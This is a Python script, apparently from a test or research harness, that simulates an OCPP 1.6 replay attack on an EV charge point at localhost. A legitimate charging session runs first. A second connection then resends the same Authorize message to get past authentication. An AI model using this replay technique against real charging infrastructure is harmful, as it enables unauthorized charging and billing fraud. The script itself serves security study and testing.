import asyncio
import websockets
import logging
from .charge_point import MelikReplayCP
from ocpp.v16.enums import ChargePointStatus

# Standart Tanımlayıcılar # [cite: 201-203]
SCENARIO_NAME = "replay_attack" 
CP_ID = "CP_MELIK"
WS_URL = f"ws://localhost:9000/{CP_ID}"

async def run_scenario(mode="normal"):
    """Senaryoyu normal veya saldırı modunda koşturur."""
    
    # 1. FAZ: Normal Kullanıcı Akışı (Meşru Oturum)
    async with websockets.connect(WS_URL, subprotocols=["ocpp1.6"]) as ws:
        logging.info(">>> [MELIK] Normal kullanıcı bağlandı.")
        cp = MelikReplayCP(CP_ID, ws)
        cp_task = asyncio.create_task(cp.start())

        await cp.send_boot()
        await cp.update_status(ChargePointStatus.available)
        
        logging.info(">>> [MELIK] Meşru kullanıcı kartını okutuyor...")
        # Meşru AUTH paketi - bunu kaydedip replay yapacağız
        auth_response = await cp.send_authorize()
        
        if auth_response.id_tag_info['status'] == 'Accepted':
            await cp.update_status(ChargePointStatus.charging)
            logging.info(">>> [MELIK] Şarj başladı (Meşru).")
            await asyncio.sleep(2) 
            await cp.update_status(ChargePointStatus.available)
            logging.info(">>> [MELIK] Şarj bitti. Kullanıcı ayrıldı.")
        
        cp_task.cancel()
        logging.info(">>> [MELIK] Bağlantı kapatılıyor (Kullanıcı gitti).")

    # Saldırı modu değilse burada bitir
    if mode != "attack":
        return

    # 2. FAZ: Bekleme (Saldırgan Tespiti/Hazırlığı)
    # Gerçek hayatta bu 10-30 dakika olabilir. Simülasyon için 5 saniye.
    logging.info("⏳ [MELIK] Saldırgan paketleri analiz ediyor (Bekleme modu: 5 sn)...")
    await asyncio.sleep(5)

    # 3. FAZ: Saldırı (Replay - Yeni Bağlantı)
    logging.warning("!!! [MELIK] KRİTİK: Saldırgan YENİ TCP oturumu ile bağlanıyor !!!")
    
    async with websockets.connect(WS_URL, subprotocols=["ocpp1.6"]) as ws_attacker:
        cp_attacker = MelikReplayCP(CP_ID, ws_attacker)
        attacker_task = asyncio.create_task(cp_attacker.start())
        
        # Saldırgan da Boot eder (veya etmez, ama bağlanınca genelde boot beklenir)
        # Replay saldırısında bazen boot atlanır direkt Auth basılır. Biz boot yapalım.
        await cp_attacker.send_boot()
        
        logging.warning("!!! [MELIK] Ele geçirilen paket TEKRAR OYNATILIYOR (Replay) !!!")
        # Aynı Authorize paketi tekrar gönderiliyor
        # Not: Nonce yoksa bu işlem başarılı olur
        await cp_attacker.send_authorize() 
        
        await asyncio.sleep(2)
        attacker_task.cancel()
        logging.info("🚨 [MELIK] Saldırı tamamlandı.")
